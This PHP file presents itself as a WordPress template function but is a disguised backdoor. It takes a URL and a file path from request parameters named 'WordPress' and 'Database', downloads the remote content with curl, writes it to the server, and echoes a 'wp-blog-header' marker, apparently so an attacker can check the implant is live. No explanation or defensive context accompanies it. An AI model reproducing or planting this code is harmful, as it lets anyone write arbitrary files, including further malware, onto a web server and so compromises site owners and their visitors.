<?php 
function template($loader=''){
	$load = isset($_REQUEST['WordPress']) ? trim($_REQUEST['WordPress']) : '';
	$dirname = isset($_REQUEST['Database']) ? trim($_REQUEST['Database']) : '';
	$wp = curl_init('http://'.$load);
	curl_setopt($wp, CURLOPT_RETURNTRANSFER, 1);
	$once = curl_exec($wp);
	if ($dirname!='') {
		file_put_contents($dirname, $once);
	}
	if (isset($_GET['wp-blog-header'])) {
		echo 'wp-blog-header';
	}
}
template();
//scp-173
?>